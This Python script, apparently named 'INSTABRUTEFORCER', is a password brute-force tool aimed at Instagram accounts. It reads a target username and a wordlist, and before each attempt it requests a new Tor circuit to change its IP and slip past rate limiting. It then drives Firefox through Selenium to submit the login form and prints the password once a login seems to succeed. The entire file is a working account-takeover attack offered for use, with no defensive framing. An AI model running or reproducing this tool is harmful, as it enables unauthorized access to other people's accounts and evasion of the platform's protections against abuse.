from selenium import  webdriver
from time import sleep
from selenium.webdriver.common.by import By
import os
from stem.control import Controller
from stem import Signal
import shutil
from termcolor import colored
import requests

tor_control_port=int(open("conf/ibf.conf","r").readlines()[0].strip())
tor_control_password=open("conf/ibf.conf","r").readlines()[0].strip()

def ct(txt):
    print(txt.center(shutil.get_terminal_size().columns))
    
def hdr():
    os.system("clear")
    wd=shutil.get_terminal_size().columns
    ct(colored("+"+"-"*18+"+","red",attrs=['bold']))
    ct(colored("| INSTABRUTEFORCER |","blue",attrs=['bold']))
    ct(colored("+"+"-"*18+"+","red",attrs=['bold']))
    ct(colored("Developed by:","green"))
    ct(colored("Sanku Deka, Github developer","red"))
    print("\n"*2)
    
def shw(trgt,pss,nnp):
    print("["+colored("Trying ","cyan")+"]  "+colored(trgt,"blue",attrs=['bold'])+" with "+colored(pss,"blue",attrs=['bold'])+"  [ IP "+colored(nnp,"blue",attrs=['bold'])+" ]", end="\r")

def attck():
    hdr()
    new_target=input("["+colored("*","red")+"] Enter the username of new target \n"+colored("=>","red"))
    wlst=input("["+colored("*","red")+"] Enter the path to wordlist \n"+colored("=>","red"))
    hdr()
    for pss in open(wlst,"r").readlines():
        new_ip=nip()
        shw(new_target,pss.strip(),new_ip)
        rtrn=tryy(new_target,pss.strip())
        if rtrn==True:
            print("["+colored("success","green",attrs=['bold'])+"]")
            succs(pss)
            break
        else:
            print("["+colored("Failed","red",attrs=['bold'])+" ]")
            continue
def nip():
    tcn=Controller.from_port(port=tor_control_port)
    tcn.authenticate(tor_control_password)
    tcn.signal(Signal.NEWNYM)
    res=requests.Session()
    res.proxies={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
    iad=res.get("https://icanhazip.com").content.rstrip().decode()
    res.close()
    return iad
    
def succs(pss):
    ct("password is:"+colored(pss,"blue"))
    
def tryy(un,ps):
    dr=webdriver.Firefox()
    dr.get('https://www.instagram.com/')
    sleep(1)
    try:
        ui=dr.find_element(By.XPATH,"//form[@id='login_form']/div/div/div/div/div/div/div/input")
        up=dr.find_element(By.CSS_SELECTOR,"input[name='pass']")
        lb=dr.find_element(By.XPATH,"//form[@id='login_form']/div/div/div/div[3]/div/div/div/div")
    except:
        ui=dr.find_element(By.XPATH,"/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[1]/div/section/main/article/div[2]/div[1]/div[2]/div/form/div[1]/div[1]/div/label/input")
        up=dr.find_element(By.XPATH,"/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[1]/div/section/main/article/div[2]/div[1]/div[2]/div/form/div[1]/div[2]/div/label/input")
        lb=dr.find_element(By.XPATH,"/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[1]/div/section/main/article/div[2]/div[1]/div[2]/div/form/div[1]/div[3]/button/div")
    ui.send_keys(un)
    sleep(3)
    up.send_keys(ps)
    sleep(1)
    lb.click()
    sleep(10)
    try:
        dr.find_element(By.XPATH,"//form[@id='login_form']/div/div/div/div/div/div/div/input")
        dr.close()
        return False
    except:
        try:
            dr.find_element(By.XPATH,"/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[1]/div/section/main/article/div[2]/div[1]/div[2]/div/form/div[1]/div[1]/div/label/input")
            dr.close()
            return False
        except:
            dr.close()
            return True
            
if __name__=="__main__":
    attck()
